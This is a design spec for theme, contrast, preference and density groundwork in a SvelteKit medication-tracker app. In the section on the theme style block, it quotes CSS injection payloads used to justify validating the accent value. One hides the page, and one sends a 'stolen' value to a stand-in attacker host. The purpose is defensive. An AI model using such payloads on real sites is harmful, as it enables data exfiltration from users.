# Appearance Customization — Foundation Design

The app is dark-only. Not "dark by default" — dark by construction: a grep across
`src/` and `static/` for `prefers-color-scheme`, `dark:` and `.dark` returns zero
matches, and `--color-surface: #0a0a0f` is applied unconditionally to `body`
(`app.css:7,28`). The Appearance settings page offers five controls: ten preset accent
swatches, date format, time format, a two-value density select, and a reduce-motion
checkbox.

One of those five did nothing. `dateFormat` was **write-only** — stored since the
original schema, validated at all three doors, rendered as a `<select>`, and read by no
formatter anywhere in `src/`. Changing it changed nothing a user could see. It is now
wired through `formatUserDate` (`utils/time.ts`); see
[the repair below](#the-dateformat-repair) for why the fix is invisible to everyone who
never touched the control.

The ask is much more customization than that — theme modes, typography, layout, motion.
This spec covers the **foundation** that makes those cheap and correct, and it is
deliberately not the feature list. It is four PRs, only one of which ships a new option.

Two things surfaced during design that changed its shape, and both are the reason this
document leads with repair rather than with features.

**The current dark palette already fails WCAG**, verified by computing relative
luminance over the real token values:

| Pair                                            | Ratio                  | Reach                          |
| ----------------------------------------------- | ---------------------- | ------------------------------ |
| `text-muted` #71718a on `surface-raised`        | **3.93:1**             | 122 uses / 37 files            |
| `text-muted` on `glass-hover`                   | **2.93:1**             | below even the 3:1 floor       |
| `glass-border` composited (#27272c) on the page | **1.33:1**             | every form input, 11 files     |
| `text-accent` #6366f1                           | 4.42 → 3.11            | fails on all six dark surfaces |
| `bg-danger/10 text-danger` error banner         | **4.00:1**             | 23 call sites                  |
| `accent-fg` on `accent`                         | white 4.47, black 4.23 | **neither option clears 4.5**  |

That last row is worth sitting with. `accentFg()` (`(app)/+layout.svelte:14-27`) runs a
correct WCAG calculation to pick the better foreground, and against the default accent
both candidates fail — it is faithfully choosing the less-bad of two failures.

**The axe suite passes anyway, because it cannot see any of this.** `scan()`
(`tests/e2e/accessibility.test.ts:20-30`) reads `results.violations` and discards
`results.incomplete` — and `incomplete` is exactly where axe puts contrast it cannot
resolve behind a semi-transparent, `backdrop-filter`ed parent, which is every
`bg-glass` card in the app. An opaque light palette makes those computable, so
**enabling light mode would surface pre-existing dark-mode failures as new `serious`
violations** and gate that PR on unrelated work. This is the single strongest argument
for the ordering below.

## Scope

Four PRs, sequential. Each ships independently.

- **1a — Accessibility and token hygiene.** No new features. Fixes the contrast
  failures above, a live mobile layout bug, and the hardcoded colours that would
  break any second palette. Ships a more accessible dark-only app.
- **1b — Preference substrate.** The option registry, per-field save doors, two
  derived-type deletions, and the audit race. Invisible to users.
- **1c — Theme.** Light / dark / system, delivered through the mechanism in Decision 2.
  The only PR here that ships a user-visible option.
- **1d — Density.** Real spacing tokens replacing class-name targeting, plus a third
  tier.

Later phases — the Appearance page rebuild with live preview, typography, layout width,
motion levels and delight — are out of scope for this document. They are cheap once
1a–1d land, which is the point.

## The constraints that decided the mechanism

Three, all in `svelte.config.js`, and they close off what most apps do:

- **`script-src: 'self'`.** The standard anti-FOUC trick — an inline `<script>` in
  `app.html` that reads `localStorage` and sets a class before paint — is blocked.
  Measured on both page classes: no hash on the prerendered page, no nonce path on
  dynamic ones.
- **`style-src: 'self' 'unsafe-inline'`.** Inline styles _are_ permitted, and
  SvelteKit's `style_needs_csp()` (`runtime/server/page/csp.js`) returns early when a
  directive already contains `unsafe-inline`, so Kit adds neither nonce nor hash to
  `style-src`. This is the seam. It is also load-bearing: rebuilt with
  `style-src: ['self']`, the style element is still inserted but **not applied**, the
  page silently reverts to the compiled dark default, and only a console message says
  so.
- **`font-src: 'self'`.** Any font beyond `system-ui` must be self-hosted. Relevant to
  a later phase, recorded here so it is not rediscovered.

## Decisions

1. **1a ships first, as a standalone accessibility fix.** Ordering, not taste — see
   the axe-`incomplete` finding above.
2. **The theme is an SSR-rendered `<style>` block emitted from `<svelte:head>` in
   `(app)/+layout.svelte`, scoped to the `(app)` group, with no cookie and no
   `hooks.server.ts` change.**
3. **The block is emitted at `:root:root` specificity, not `:root`.**
4. **The stored accent drives fills only. Text and border accent come from a derived,
   per-scheme `--color-accent-text` that the theme layer owns.**
5. **High-contrast overrides move into the theme table, per scheme.**
6. **The registry is two modules: metadata with no zod, and a server-only schema
   module derived from it.**
7. **Instant save uses per-field named form actions, not one loosened schema.**
8. **`updatePreferences` computes its before-image inside the write, not before it.**

### Why `(app)`-scoped and not the root layout (decision 2)

Three mechanisms were built and measured against the real production bundle
(`.svelte-kit/output/server/index.js`, driven by headless Chromium). Two were ruled out
outright:

- **`hooks.server.ts` + `transformPageChunk` stamping `<html>`** runs only on full
  document renders. Sign-in (`auth/login/+page.svelte:53`) and the settings save both
  use `use:enhance` → `invalidateAll()` → `__data.json`, and SvelteKit's client router
  never rewrites `<html>`. The attribute goes stale on precisely the interaction that
  changes it. Compounding it, `src/routes/+page.ts:7` exports `prerender = true`, so the
  anonymous build-time value freezes into CDN HTML — and CI runs `npm run build` with a
  placeholder `DATABASE_URL`, so an ungated preferences read there fails the build
  rather than degrading.
- **`<svelte:html>`** does not exist in Svelte 5.55.4. Hard compile error.

The surviving mechanism was measured on the real app and every load-bearing claim
reproduced: the `<style>` block appears in the SSR'd `<head>`; `body` background flips
`rgb(10,10,15)` → `rgb(254,254,254)`; a `use:enhance` save updates it **in place with
zero hard page loads**, same JS context, same component instance; exactly one element
survives hydration and eight further toggles; CSP permits it with zero violation
events; and first paint is already correct at the first `requestAnimationFrame`.

The open question was where to put it. Putting it in the **root** layout is tempting —
it would cover `/auth/*` and the landing page — and it fails, in a way that took a
mutation test to prove. A `+layout.server.ts` load that reads only `locals` (or only
`cookies`) serialises as `uses:{}`. The client then sends
`x-sveltekit-invalidated=010`, the server replies `{"type":"skip"}` for node 0, and
that node's data is reused **for the rest of the session**. Measured: a light-preferring
signed-in user hard-loads `/`, clicks through to `/dashboard`, and gets
`bodyBg rgb(10,10,15)` while the rendered DOM says the preference is light. A hard
reload fixes it; navigating back breaks it again. Proven causal by mutation — adding
`void url.pathname` flips the header to `=110` and node 0 returns real data.

So the root layout needs a deliberate tripwire (`void url.pathname`) whose deletion
silently breaks theming on the app's main entry path, plus a cookie to keep a
now-every-navigation load off the database, plus a landing-page-only `$effect`
reconciler, plus cookie lifecycle (clear on logout, or a shared browser hands the next
person the previous user's theme).

`(app)/+layout.server.ts` has none of those problems, because the `(app)` node does not
exist in the branch until you enter the group — it is always fresh and always runs. It
already loads preferences. The cost is that `/auth/*` and `/` do not get the user's
stored theme; they get a pure-CSS `prefers-color-scheme` fallback instead, which for an
anonymous or shared context is arguably the better answer. Adding the cookie later is
additive if that trade stops being acceptable.

**Consequences to write into the code:**

- Only the whole-element `{@html}` form works. `<style id="x">{@html css}</style>`
  emits the literal text `{@html css}` into the stylesheet. Measured.
- The literal characters `</style>` inside a `.svelte` file break `npm run check`
  ("`<script>` was left open"), and in dev `vite-plugin-svelte`'s
  `code.lastIndexOf('</style>')` HMR hack appends a stray ` *{}` to the CSS. Build the
  tag in a `.ts` module with the closing tag split (`` `</` + `style>` ``). Absent from
  production builds either way, but the dev artifact is confusing and the
  `npm run check` failure is not optional.
- **`{@html}` applies zero escaping, and CSP does not cover CSS injection.** A value
  containing `</style>` provably breaks out and injects elements into `<head>` (script
  execution is blocked by `script-src`, so that half is contained). But pure CSS
  injection needs no tag break at all: `#fff} body{display:none;} :root{` hid the body
  with zero CSP messages, and
  `#fff} body{background-image:url(https://evil.example/leak?t=stolen)} :root{`
  produced a **real outbound request**, permitted by this app's
  `img-src 'self' data: https:`. Token names and non-accent values come from a frozen
  table and are never interpolated; the accent is the single stored value that reaches
  the string, and it is re-tested against `/^#[0-9a-f]{6}$/i` **at the interpolation
  site**, not only at the form door. This is a requirement, not defence in depth.
- The mechanism depends on `unsafe-inline` staying in `style-src`. That directive gets
  a comment in `svelte.config.js` saying so.

### Why `:root:root` (decision 3)

`app.css:140-147` is an unlayered `@media (prefers-contrast: more) { :root { … } }`
block overriding four tokens. A plain `html[data-theme]` or `:root` theme rule is also
unlayered, so layer precedence separates nothing and the two collide.

The collision is not stable, which is what makes it nasty. Measured on the real
production build: on the **SSR** path the `<svelte:head>` block lands at head index 24
and the app stylesheet `<link>` at 25 — `Head.build()`
(`runtime/server/page/render.js:756`) emits rendered head content before stylesheet
links, always — so at equal specificity the stylesheet wins and the contrast block
overrides the theme. On a **client-side navigation** back into the group, Svelte appends
the block at index 41 against a stylesheet at 23, and now the theme wins.

Same user, same URL, same stored theme: `--color-text-secondary` is `#a0a0b8` after a
reload and `#55556a` after a client-side nav. **A plain F5 flips the palette.**

And on the SSR path the losing side is the accessible one. Measured at
`prefers-contrast: more` with the light theme active: `--color-text-secondary` resolves
to `#a0a0b8` — **2.53:1** on `#fefefe`, against 7.20:1 for the intended value —
`--color-text-muted` to 3.09:1, and `--color-glass-border` to `#ffffff3d`, white on
white. The users who asked their OS for more contrast would get the least.

`:root:root` is specificity (0,2,0). It beats the unlayered `:root` contrast block
regardless of head position, which fixes the accessibility regression and the SSR/CSR
divergence in one move. It does not depend on head order, on `@layer`, or on source
order, all of which were measured to be unreliable here.

### Why the accent splits in two (decision 4)

`(app)/+layout.svelte:37-38` delivers the accent as **inline**
`style:--color-accent` / `style:--color-accent-fg` on a wrapper div. Inline styles
outrank everything and inherit down the whole subtree, so the theme layer physically
cannot re-tune the accent inside `(app)`.

That matters because the ten presets (`settings/appearance/+page.svelte:9-18`) were
picked against a near-black page. Measured as text against the proposed light surface:
**all ten fail 4.5:1**, and six fail even the 3:1 UI floor — amber 1.88, cyan 2.13,
emerald 2.23, orange 2.46, pink 3.10, blue 3.23. A user who picks amber in dark mode and
switches to light gets an effectively invisible accent across 67 `text-accent` sites
plus `border-accent` and `ring-accent`.

So: the stored hex keeps driving `bg-accent` fills, where `accentFg()` already picks a
readable foreground. Text and border accent move to `--color-accent-text`, derived
per scheme server-side from the stored hue and owned by the theme layer. The derivation
lives in the same shared module as the unified luminance maths (see Testing), which is
why that consolidation has to land in 1a, before 1c can switch a light palette on.

`validation.ts:233/357/570` accepts any `#RRGGBB` at three doors with no contrast check
at all. That stays true — the guard is advisory, per the original design — but with the
split, a bad choice degrades the fill rather than making every label unreadable.

### Why the contrast block moves into the theme table (decision 5)

Once `:root:root` wins unconditionally, `@media (prefers-contrast: more)` stops meaning
anything — it is outranked by design. The four overrides therefore move into the theme
table as a per-scheme `contrastMore` set, emitted inside the same specificity-bumped
block. This is a strict improvement regardless: mirroring dark's high-contrast values
into light moves contrast the wrong way, so a light arm had to be authored anyway.

### Why the registry is two modules (decision 6)

Nothing under `src/lib/components` or any `.svelte` file imports `$lib/utils/validation`
or zod today — verified by grep; `validation.ts` is reached only from `+page.server.ts`
and `+server.ts`. The appearance page must import the registry to render its controls
(labels, groups, option lists). If the zod validators live in the same module, that
import pulls zod into the client bundle for the first time.

- `src/lib/appearance/registry.ts` — key, group, label, control kind, and how the option
  reaches the DOM. No zod. Imports from `$lib/server/*` are **type-only**; a value
  import would drag drizzle into the browser bundle.
- `src/lib/appearance/schema.ts` — imports the registry plus zod, builds the schemas,
  imported only from server files.

A test asserts no `.svelte` file transitively imports zod.

### Why per-field actions (decision 7)

`appearanceSchema` (`validation.ts:232-238`) is **required** for `accentColor`,
`dateFormat`, `timeFormat` and `uiDensity`, because today one form submits every control
at once. Instant save posts one field. `Object.fromEntries(await request.formData())`
then `safeParse` therefore fails and the action returns `fail(400)` — every save, on
both the JS and non-JS paths.

The obvious fix — make the derived form schema all-optional — silently changes the
door's behaviour, because zod strips unknown keys: a mistyped field name becomes a
no-op instead of a 400. So the registry models **three arities** and the doors do not
share one object schema:

| Door                           | Arity                                           |
| ------------------------------ | ----------------------------------------------- |
| Appearance form (`?/theme`, …) | required, exactly one registry entry per action |
| `/api/v1` `update_preferences` | all optional                                    |
| Backup import                  | all optional, bounded                           |

The three-arity requirement is not new; it is why `heatmapPeriod` currently accepts any
integer at `validation.ts:370` and is bounded 1–3650 at `:583`. Collapsing those into
one registry entry **changes behaviour at one door whichever bound wins** — the bound
belongs to the arity, not the option.

### Why the audit before-image moves inside the write (decision 8)

`updatePreferences` (`preferences.ts:46-75`) reads the before-image via a separate,
non-transactional `getOrCreatePreferences`, then updates and diffs. That is safe for one
bulk save per click. Under instant save it is not: double-click a theme or density
control (A → B → A) and both requests can read `before = A`. The second computes
`computeChanges(A, A) = null` and writes no audit row. The database ends at A while the
audit log records only A → B.

CLAUDE.md's invariant is that no door "can change a preference without leaving an audit
row". Under instant save the log is not merely incomplete, it is **actively wrong**.

The fix is to compute the diff against the row the write actually replaced — a single
statement, or a transaction — plus client-side serialisation that aborts an in-flight
save for the same key before issuing the next. Because the correctness here is decided
by the database, the test belongs on **PGlite** (`tests/unit/pg/`), not `fake-db`, per
the repo's own rule.

## The `dateFormat` repair

Landed outside the 1a–1d sequence, because it is neither an accessibility defect nor
part of the substrate — it is a control that lied. The macOS spec's inherited-quirks
register (`2026-07-25-macos-app-design.md:338`) had already resolved the same quirk as
**"Implement it — it should do what it says"**; this is the web half of that decision,
so the two platforms no longer disagree about whether the setting is real.

**The trap is that the stored values are not the rendered shapes.** The enum is
`DD/MM/YYYY | MM/DD/YYYY | YYYY-MM-DD`, but every surface that rendered a date as
_prose_ used an abbreviated month name — `15 Apr 2026`, `Wed 15 Apr`, `Wed, 15 Apr 2026`.
(The one exception proves the point rather than undermining it: the session-expiry line
used a bare `toLocaleDateString()`, which is all-numeric _and_ dependent on the browser's
locale rather than the user's setting — it was one of the two latent bugs below.) Applying the enum as a literal pattern would therefore
have changed what **every** account sees, including the overwhelming majority sitting on
the `DD/MM/YYYY` default who never opened the page — a silent app-wide regression
delivered as a bug fix, and a loss of the weekday the Log headings carry deliberately.

So the two named-month orders map to a **locale** instead: `DD/MM/YYYY` → `en-GB`,
`MM/DD/YYYY` → `en-US`. The default then reproduces every prior hardcoded format
byte-for-byte (asserted in `tests/unit/time.test.ts`), and the setting genuinely reorders
the fields for anyone who changes it. `formatUserDate` splits responsibility so this
stays true as surfaces are added — the preference owns order and numeric-vs-named month,
the call site owns which fields appear.

**`YYYY-MM-DD` is the exception, and it is not a locale.** The first cut of this repair
mapped it to `en-CA` and let `Intl` render the whole string, which works on today's ICU
and is why the empirical check passed. ECMA-402 does not promise it: field order and
separator are CLDR data that is allowed to change, and `en-CA`'s short-date pattern
already changed once in ICU 72, so a conformant implementation may return `15/04/2026`.
`isoDate` therefore assembles the string from `formatToParts` — specified per field —
and re-pads the widths. This matters more than the usual "don't parse localised output"
caution because `formatUserDate` is reached from `.svelte` components, so the ICU that
decides is the **viewer's browser**, not the pinned server one; and no test observing
output on the server runtime can catch the divergence.

**Four surfaces are labels and take the preference:** the Log day headings, the
medication inventory-event history, the PDF report, and the session-expiry line on
Settings → Security. Two of them — the event history and the session-expiry line — were
also quietly wrong beforehand: the event history passed no `timeZone` at all, so it
rendered in the _browser's_ zone while the rest of the app used the profile zone, and the
security line used a bare `toLocaleDateString()`.
Routing both through the canonical formatter fixes that as a side effect. It also changes
two renderings, both accepted rather than incidental. The event history's day loses its
leading zero (`05 Apr` → `5 Apr`), because unifying on one formatter is worth more than a
per-site padding knob. Less obviously, its **clock** changes too: the old single `Intl`
call hardcoded `en-GB` with `hour`/`minute`, which renders 24-hour, so `18:20` becomes
`6:20 pm` for every account on the `12h` default. That is the setting doing what it says —
the site had simply been ignoring `timeFormat` — but it is a visible change on a surface
nobody asked to change, so it belongs in this list and not in a footnote.

**Everything else is a key and must not follow the preference:** the day keys in
`analytics.ts`, `schedule.ts`, `log/+page.svelte` and `medications/+page.server.ts`, and
the CSV date cell. That last one is the sharp edge — `import/csv.ts` re-reads it as
strict `YYYY-MM-DD`, so a user on `MM/DD/YYYY` would export a file their own account
then refuses to import. The time cell beside it _is_ preference-driven only because
`parseClockTime` was written to read both clocks back; there is no date equivalent, and
adding one would make `01/02/2026` ambiguous on the wire. Every exempt site carries a
comment saying so — `analytics.ts` and `schedule.ts` included, which for a while the
claim covered without it being true.

Being exempt from the _preference_ is not the same as being free to borrow a locale.
Keys go through `isoDayKey` for the same reason labels do: `Intl` left the year unpadded,
so a dose dated before year 1000 wrote a CSV cell the importer rejects, and the column
sat one CLDR change away from reordering entirely.

**Not changed:** the column, its default, all three zod schemas, `serializePreferences`,
the backup round trip and `docs/api-v1-contract.md`. Only the `<select>`'s labels move,
and they are now generated by the formatter they configure (`DD/MM/YYYY — 15 Apr 2026`),
so the control cannot advertise a shape the app does not render. The 1b registry should
model `dateFormat` as a live option with the three arities, not a reserved field.

## 1a — Accessibility and token hygiene

No new user-facing options. Everything here is a defect.

**Contrast.** Fix the six measured failures in the table at the top. `--color-glass-border`
additionally splits: one value cannot be both a decorative card hairline and a 3:1 input
boundary (WCAG 1.4.11), so `--color-border-strong` is separated out for the control
boundaries — the resting border of every form input, across 11 files. The remaining
`glass-border` uses (~140 across 42 files) stay decorative and keep the hairline value;
sorting which is which is the bulk of this item's work.

**The compact-mode mobile bug.** `app.css:46` uses the `padding` **shorthand** on `main`,
and because the rule is unlayered it beats Tailwind's `pt-18`. In compact mode on mobile
the top ~3.7rem of every page slides under the `fixed` MobileHeader. This is live today.
It is listed here rather than in 1d because it is a bug, not a refactor — but 1d must not
delete that block without a replacement that preserves the top offset, or it relocates
the bug rather than fixing it.

**`text-white` bypasses — thirteen sites, not one.** The app computes a contrast-correct
`--color-accent-fg` and then thirteen places ignore it: `analytics/+page.svelte:78`, both
landing CTAs (`+page.svelte:37,64`), all five auth submits (`auth/login:93`,
`auth/register:116`, `auth/2fa:58`, `auth/reset-password:63`,
`auth/reset-password/confirm:66`), two destructive confirms at ~3.7:1
(`settings/data:140`, `settings/data/import:380`), `Heatmap.svelte:84`, and the skip link
at `app.html:30`. The five auth submits need `--color-accent-fg` to _reach_ them — they
sit outside the `(app)` group, where it is never applied.

**Heatmap.** `Heatmap.svelte:33-38` hardcodes a `bg-emerald-500/*` intensity ramp and
`bg-white/10` empty cells; `:84` hardcodes a `bg-gray-900` tooltip. Moves onto
`--color-heatmap-0..4` and `--color-surface-overlay`. The ramp is authored
accent-neutral, with adjacent steps holding ≥1.36:1 under simulated protanopia,
deuteranopia and tritanopia.

**Heatmap reduced-motion.** The stagger override honours the OS media query but ignores
the in-app `data-reduced-motion` toggle. The naive fix compiles to nothing: the rule
lives in a component `<style>` block, which Svelte scopes, and
`[data-reduced-motion="true"] .heatmap-cell` produces `css_unused_selector` and emits a
dead comment — verified by compiling against the installed Svelte 5.55.4. `npm run check`
does not pass `--fail-on-warnings`, so it would ship green with the defect intact. It
must be `:global([data-reduced-motion="true"]) .heatmap-cell`, and it has no pure-output
test attach point, so it is verified in a browser or by asserting on the compiled CSS.

**Toast.** `<Toast />` is mounted in exactly one place, `dashboard/+page.svelte:43`, while
`showToast()` is called from `TimelineEntry`, `DoseEditForm`, `QuickLogBar`,
`MyDayTimeline` and `settings/notifications`. The store is module-scoped so nothing
throws — the toasts are simply never rendered on `/log` or `/settings/notifications`.
Deleting a dose from the Log page gives no confirmation at all today.

The mount moves to `(app)/+layout.svelte`, and **the dashboard mount is deleted in the
same commit**. Toast's `$state` is module-level, so two mounted instances render every
toast twice inside two `aria-live="polite"` regions and screen readers announce it twice.
Second-order: module-level state is per-process on the server, so mounting in the layout
means it SSRs on every authenticated page — `showToast` gets a `browser` guard to make
the cross-user leak class impossible, and the module block gets a comment saying exactly
one instance may be mounted.

**Document shell.** Four surfaces outside `src/lib` and `src/routes`:
`static/manifest.json` hardcodes `background_color: "#0a0a0f"`; `+layout.svelte:24` sets
one static `<meta name="theme-color" content="#6366f1">` with no `media` variants;
`app.html:11` sets `apple-mobile-web-app-status-bar-style="black-translucent"`, which
paints light status-bar glyphs over page content; and the skip link at `app.html:30` sits
outside the `(app)` wrapper so it never receives the user's accent. 1a routes the skip
link through the token and adds paired `theme-color` media variants; the manifest
`background_color` cannot vary per user and is decided in 1c.

**Smaller defects.** `--radius-sm` is defined and never used (`rounded-sm` has zero
matches) while checkboxes and small chips use the bare `rounded` class, a tier below the
scale; `Heatmap.svelte:65` uses an arbitrary `rounded-[2px]`. The `count-up` keyframe
(`app.css:71-80`) is defined and never referenced. The mobile sidebar's
`transition-transform` (`(app)/+layout.svelte:64`) is inert — the element is mounted by
`{#if}` with no transition directive and nothing ever changes the transform.
`dashboard/+page.svelte:110-115` hand-rolls a card duplicating `GlassCard`'s exact class
string, for what is an empty state that should use `EmptyState`.

## 1b — Preference substrate

The registry and schema modules per decisions 6 and 7, the per-field actions, and the
audit fix per decision 8.

Two hand-written restatements are **deleted** rather than tested around. Both were proven
safe by applying them in a throwaway copy: `svelte-check` across 1194 files produced zero
new errors (baseline and patched both show the same three pre-existing failures, all from
`@electric-sql/pglite` being absent from the worktree's `node_modules`), 137 related tests
passed, and a type-level equality probe showed the resulting types are byte-identical.

- `serializePreferences`'s inline parameter type (`api/serialize.ts:141-156`) becomes
  `UserPreferences`. It is already handed a full DB row; the literal existed only to be
  forgotten. Note that `{ ...p }` spreads unlisted columns through **at runtime** while
  the type omits them, so the drift is invisible on the read side.
- `ImportPreferences` (`import/types.ts:126-139`) becomes
  `Partial<Omit<UserPreferences, "userId" | "updatedAt">>`. Not a boundary violation —
  the module already type-imports the schema at `:13` and lives under `$lib/server/`.

What the compiler does **not** protect, and therefore needs the conformance test: the two
API-door zod schemas (`validation.ts:356-372`, `:569-585`), both plain `z.object`s that
strip unknown keys silently. If `theme` is not added to both, `serializePreferences` will
emit it on export while import cannot read it back — the round trip documented in
`docs/api-v1-contract.md` §5 breaks on the very field this work adds, with a 200, no
error and no audit row. `import-round-trip.test.ts` gains a case setting each new field to
a non-default value and asserting it survives export → import.

`docs/api-v1-contract.md:343-362` and `:436` are a third and fourth hand-written
restatement with no compiler coupling, published to the separate `medtracker-mac` repo.

**Rate limiting.** Instant save turns the appearance action into an unthrottled
authenticated write path — `checkRateLimit` is currently used only by
`settings/notifications` and `settings/data/import`. It gains a guard matching that
precedent, and the client debounces so a settled control produces one POST. This also
bounds audit growth: audit rows are user-visible at `/settings/privacy` and exported via
`/api/audit`, and `audit.ts` has no retention or pruning.

## 1c — Theme

Light, dark and system, delivered per decisions 2–5.

`system` needs **no JavaScript**: the fallback palette is a `@layer theme`
`@media (prefers-color-scheme: light)` block, and the browser resolves it. It must be
**layered** — measured with it unlayered, a user with `theme: dark` and a light OS
silently rendered light (the OS beat the explicit choice), and `theme: light` with a dark
OS produced an incoherent split state, because the media block redefines only a subset of
tokens.

The light palette is authored against measured ratios, not picked by eye: surface
`#eef0f6`, raised `#ffffff`, overlay `#e2e5ee`, text `#14141c` / `#4c4c63` / `#5c5c72`,
accent `#4f46e5` / `#4338ca`, success `#036b4e`, warning `#7f5300`, danger `#b41f17`.
Every pair passes 4.5:1 on the surfaces it is actually used on, including on its own /10,
/15 and /20 tinted chips. The status values are deliberately darker than the obvious
Tailwind-700 picks, which fail: `#047857` measures 4.35 on `surface-overlay` and 4.03 on a
/20 chip; `#c2261d` measures 4.14 on a /20 chip.

**Three tokens cannot be mirrored** and need structural changes, not new values:
`--color-glass` is white-alpha, an elevation _lightener_, and a no-op on a light page;
`--color-glass-hover` must flip sign, because light cards hover darker (`medication-style.ts:56-61`
already hand-rolls exactly this workaround for medication pills, and is the template);
`--color-glass-border` must flip to dark-alpha, on top of the `--color-border-strong`
split from 1a. `--color-surface-overlay` also inverts direction — four of its five uses
are recessed tracks and chips that must go darker in light mode, not lighter.

New tokens: `--color-info` (breaks the accent-as-status overload, where refill "watch" and
neutral insights currently render `text-accent` and would collide with `warning`/`danger`
for anyone picking an amber accent), `--color-danger-fg`, `--color-success-fg`,
`--color-warning-fg`, `--color-scrim`, `--color-accent-text`, and `--color-heatmap-0..4`.

**`data-density` and `data-reduced-motion` move off the wrapper div in the same commit
that the theme block starts setting anything they touch.** If both exist, the wrapper is a
descendant and its server-data value wins for the whole app subtree — an optimistic write
would appear to do nothing inside `(app)` while working on auth pages, which is the most
confusing available failure.

The manifest `background_color` decision lands here: it cannot vary per user, so it is set
to the dark surface and light-mode users get a brief splash mismatch, recorded as a known
limitation.

## 1d — Density

The current block (`app.css:45-68`) targets six literal class names. A sweep of all 50
`.svelte` files under `src/lib/components` and `src/routes/(app)` found **71 spacing sites
it misses, 27 of them blocking** — every `gap-*`, every `space-y-1/1.5/2/3/5`, and every
`p-3`/`p-4`. Those are the dose rows, medication rows, My Day slots, the log filter bar,
refill rows and settings nav rows. Compact mode today shrinks the page shell and the card
chrome and leaves the actual _content_ at full size, which is the opposite of what "show
more on screen" means.

Replaced by named `@theme` spacing keys — `--spacing-card` generates `p-card`,
`--spacing-section` generates `space-y-section`, and so on — so a single
`[data-density="compact"]` block re-densifies every consumer by inheritance. Named keys
over the raw `p-(--x)` paren form for readability and escaping, with one caveat recorded
because it is counter-intuitive: `.prettierrc` sets no `tailwindStylesheet`, so
`prettier-plugin-tailwindcss` cannot resolve `app.css` and treats custom theme utilities
as unknown, hoisting them to the front. `p-(--x)` _is_ parsed and sorted. Adding
`tailwindStylesheet` to `.prettierrc` fixes this and is part of this PR.

Budget honestly: 36 of 59 `.svelte` files. `py-2.5` alone appears 72 times across 24
files. The proposed token set needs two keys the original design missed — a page-shell
token (`main` has nowhere to land otherwise, and see the 1a bug above) and a third
breakpoint step, since `main` is `p-4 pt-18 md:p-6 md:pt-6 lg:p-8` and a two-step token
would silently regress comfortable density at ≥1024px from 2rem to 1.5rem.

Two semantic deltas to decide rather than discover: `md:p-6` on `main` is _not_ densified
today, because class-name targeting misses variants, whereas `md:p-card` would be; and
`--spacing-control` needs a floor, because the existing `py-2.5 → 0.375rem` already yields
~32px-tall buttons, below the 44px touch minimum. The floor is scoped to
`@media (pointer: fine)` or applied unconditionally — either way it is a decision, and the
current behaviour is already wrong.

## Testing

**Contrast is asserted, not eyeballed.** A table-driven unit test over the real token
values asserts every used foreground/surface pair in both schemes, with an explicit
allow-list for any pair knowingly shipping below threshold. It hangs off the shared
luminance module from decision 4 — which is also where the duplicated WCAG maths in
`(app)/+layout.svelte:14-27` and `utils/medication-style.ts:5-27` collapses into one
implementation. Proven by mutation: change one token, watch the named test fail.

**The theme mechanism gets a browser regression test**, because its failure modes are
invisible to unit tests: assert the computed `--color-text-secondary` under
`emulateMedia({ contrast: 'more' })` on **both** the SSR load and a client-side
navigation — the `:root:root` fix exists specifically for the divergence between those
two paths.

**The light-mode axe scan needs a real seam.** `accessibility.test.ts` logs in as the
seeded user whose preferences are hardcoded in `scripts/seed-e2e.ts:136-150`. Light mode
is driven by seeding a second user, not by mutating the shared row —
`playwright.config.ts` sets no `workers: 1`, so flipping the theme in the database
pollutes concurrently running tests. The test asserts the resolved theme at the top so it
cannot pass in the wrong mode. `scan()` is extended to surface `results.incomplete`, and
the route list gains `/settings/appearance`, which it has never visited. Note the e2e job
is gated on `vars.RUN_E2E == 'true'` — confirm that is set before counting this as
coverage.

**Everything else stays on `fake-db`**, per the repo's rule, with one exception: the audit
race from decision 8 is decided by the database and belongs on PGlite, with a test that
overlaps two same-field updates.

`preferences.test.ts` extends `BASE_ROW` and gains diff-scoping coverage for each new
field. A conformance test asserts every registry key appears in both API-door schemas.

## Out of scope

- **The Appearance page rebuild, live preview, typography, layout width, motion levels
  and delight.** Deliberately deferred — they are the point of the exercise, and they are
  cheap once this lands.
- **Theming `/auth/*` and `/` with the user's stored preference.** Decision 2's accepted
  cost. They get `prefers-color-scheme`. Adding a cookie later is additive.
- **Making native `<select>` chrome match the custom fields.** `color-scheme` does not do
  this — verified. It fixes the 14 native checkboxes and radios (which have no
  `appearance: none`, no `accent-color` and no forms plugin, so they render as bright
  white squares on a near-black page today), scrollbars, and the date-picker glyph. The
  closed `<select>` is already author-controlled and unaffected; matching it needs
  `appearance: none` plus a hand-drawn chevron.
- **Audit retention.** Instant save increases row growth and `audit.ts` has no pruning.
  Rate limiting and debouncing bound it; a retention policy is a separate decision.
- **`reducedMotion` → `motionLevel`.** Belongs with motion levels in a later phase, but
  the migration shape is recorded here because it is not obvious: **no dual-write** —
  `reduced_motion = (motionLevel !== 'full')` cannot round-trip an n-ary value, and
  `scheduleType` demonstrates that a deprecated column which is still written never gets
  dropped. Add-plus-backfill in one migration (the house pattern, per `0008` and `0010`;
  `0011`'s action-level mirror is the outlier), drop in a separate later PR (`0013` is the
  precedent for the drop only). The drop must be separate because drizzle emits explicit
  column lists, so between the DROP and the deploy — and after any Instant Rollback —
  every authenticated page 500s. Keep `reducedMotion` on the wire as a derived field, and
  map it in both API-door schemas, or an older Mac client's `update_preferences` and a
  `version: 1` backup both silently lose the setting. And check the drizzle journal first:
  this database was pushed rather than migrated, so `__drizzle_migrations` can be empty
  even though the tables exist.

## Docs to update

`docs/api-v1-contract.md` §3 and the `update_preferences` row at `:436`;
`docs/database.md` for the new columns; `CLAUDE.md` for the theme mechanism's invariants
(the `:root:root` specificity requirement, the `{@html}` validation requirement, the
`(app)` scoping, and the one-Toast-instance rule); `CHANGELOG.md`; and a comment in
`svelte.config.js` next to `style-src` recording that `unsafe-inline` is load-bearing for
theming.
